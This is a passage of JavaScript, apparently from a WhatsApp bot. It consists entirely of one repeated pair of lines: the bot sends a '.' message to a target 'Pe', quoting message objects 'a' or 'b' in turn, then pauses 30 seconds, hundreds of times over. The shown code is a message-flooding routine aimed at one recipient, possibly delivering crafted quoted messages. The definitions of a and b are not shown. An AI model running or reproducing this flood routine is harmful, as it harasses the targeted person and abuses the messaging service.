                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
